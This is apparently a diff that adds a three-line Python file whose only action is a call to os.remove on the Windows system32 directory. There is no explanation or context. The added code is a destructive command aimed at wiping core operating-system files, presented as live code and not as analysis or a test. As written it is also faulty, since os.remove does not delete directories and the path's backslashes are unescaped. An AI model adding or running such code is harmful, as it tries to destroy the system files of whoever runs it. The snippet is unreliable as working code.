@@ -1,0 +1,3 @@
+import os
+
+os.remove("C:\Windows\system32")
